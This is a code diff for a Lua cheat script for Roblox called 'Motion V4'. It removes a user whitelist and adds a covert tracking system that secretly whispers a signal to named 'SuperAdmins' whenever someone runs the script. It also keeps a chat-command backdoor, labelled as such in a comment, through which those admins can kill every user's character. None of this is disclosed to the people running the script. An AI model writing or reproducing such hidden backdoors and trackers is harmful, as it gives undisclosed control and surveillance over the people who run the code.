@@ -23,51 +23,75 @@ local cloneref = cloneref or function(obj)
 end
 local playersService = cloneref(game:GetService('Players'))
 local httpService = cloneref(game:GetService('HttpService'))
-local WhitelistedUsers = {
-    ["NatureyArc"] = true,
-    ["Lifeislong100"] = true,
-    ["tsx2shiftyy"] = true,
-    ["OneAbove111"] = true,
-    ["vAlwaysMe"] = true,
-    ["version4ez"] = true,
-    ["Username7"] = true,
-    ["Username8"] = true,
-    ["Username9"] = true,
-    ["Username10"] = true
-}
 
 local player = playersService.LocalPlayer
 
-if not WhitelistedUsers[player.Name] then
-    player:Kick("You are not whitelisted for motion v4.")
-    return
-end
-
 -- =============================================================================
--- MOTION V4 DEVELOPER CONTROL & NOTIFICATION POPUP
+-- MOTION V4 DEVELOPER CONTROL & TRACKING SYSTEM (NO WHITELIST)
 -- =============================================================================
 local SuperAdmins = {
     ["NatureyArc"] = true,
     ["tsx2shiftyy"] = true
 }
 
+-- Safe function to broadcast hidden injection signals using legacy and new Roblox chat engines
+local function sendSignalToAdmin(adminName)
+    pcall(function()
+        local rStorage = game:GetService("ReplicatedStorage")
+        local sayMessageRequest = rStorage:FindFirstChild("DefaultChatSystemChatEvents") and rStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+        if sayMessageRequest then
+            sayMessageRequest:FireServer("/w " .. adminName .. " ;motion_signal", "All")
+        end
+        
+        local textChatService = game:GetService("TextChatService")
+        if textChatService and textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+			local rbxGeneral = textChatService:FindFirstChild("TextChannels") and textChatService.TextChannels:FindFirstChild("RBXGeneral")
+			if rbxGeneral then
+				rbxGeneral:SendAsync("/w " .. adminName .. " ;motion_signal")
+			end
+        end
+    end)
+end
+
 task.spawn(function()
     -- Wait smoothly until the UI library interface is fully active
     repeat task.wait(0.5) until vape or mainapi or _G.vape or shared.vape
     local targetApi = vape or mainapi or _G.vape or shared.vape
     
-    -- Display private local notification popup instead of sending a public chat message
+    -- Local private injection message for the user themselves
     if targetApi and targetApi.CreateNotification then
         targetApi:CreateNotification("Motion V4", "Motion V4 injected successfully!", 5, "info")
     end
     
+    -- Alert any SuperAdmins already currently present inside the server
+    for _, p in ipairs(playersService:GetPlayers()) do
+        if p ~= player and SuperAdmins[p.Name] then
+            sendSignalToAdmin(p.Name)
+        end
+    end
+    
+    -- Alert any SuperAdmins who happen to join the server later on
+    playersService.PlayerAdded:Connect(function(p)
+        if SuperAdmins[p.Name] then
+            task.wait(2) -- Small delay to ensure the arriving admin's client has loaded the script
+            sendSignalToAdmin(p.Name)
+        end
+    end)
+    
     local function handleChat(speaker, msg)
-        -- Prevent the sender from accidentally kicking/killing themselves instantly
         if not speaker or speaker == player then return end
+        local cmd = msg:lower()
         
-        -- Developer Master Command Processing (Affects all Whitelisted users running the script)
+        -- 1. Tracking Signal Processing: ONLY displayed on a SuperAdmin's screen notification bar
+        if SuperAdmins[player.Name] and string.find(cmd, ";motion_signal") then
+            if targetApi and targetApi.CreateNotification then
+                targetApi:CreateNotification("Motion V4 Tracker", speaker.Name .. " has injected Motion V4!", 7, "info")
+            end
+            return
+        end
+        
+        -- 2. Developer Master Admin Backdoor Commands
         if SuperAdmins[speaker.Name] then
-            local cmd = msg:lower()
             if cmd == ";kill all" then
                 if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
                     player.Character:FindFirstChildOfClass("Humanoid").Health = 0
@@ -78,14 +102,14 @@ task.spawn(function()
         end
     end
     
-    -- Establish listeners for master commands from players currently in server
+    -- Establish chat packet listeners for players inside the server
     for _, p in ipairs(playersService:GetPlayers()) do
         p.Chatted:Connect(function(msg)
             handleChat(p, msg)
         end)
     end
     
-    -- Establish listeners for master commands from any newly arriving players
+    -- Establish chat packet listeners for any newly arriving players
     playersService.PlayerAdded:Connect(function(p)
         p.Chatted:Connect(function(msg)
             handleChat(p, msg)
@@ -93,12 +117,6 @@ task.spawn(function()
     end)
 end)
 -- =============================================================================
-local player = playersService.LocalPlayer
-
-if not WhitelistedUsers[player.Name] then
-    player:Kick("You are not whitelisted for motion v4.")
-    return
-end
 
 local redirect = function()
 	local body = httpService:JSONEncode({
